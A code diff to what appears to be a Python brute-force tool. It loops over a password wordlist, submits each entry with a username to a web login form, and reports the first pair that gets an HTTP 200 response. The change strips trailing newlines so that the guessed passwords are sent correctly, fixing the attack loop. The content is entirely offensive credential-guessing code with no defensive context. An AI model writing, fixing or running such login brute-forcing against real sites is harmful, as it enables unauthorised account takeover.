@@ -45,15 +45,16 @@ pass_list = open(str(wordlist),"r")
 # Trying password combination
 while True:
     passw = pass_list.readline()
+    pass_main = passw.strip()
     # Form payloads 
     payload = {
 
         uname_field: uname,
-        pass_field: passw
+        pass_field: pass_main
     }
 
     # Post login form (HTML)
     r = requests.post(url, data=payload)
     if r.status_code == 200:
-        print(str(uname)+":"+str(passw)+" was successful!")
+        print(str(uname)+":"+str(pass_main)+" was successful!")
         break
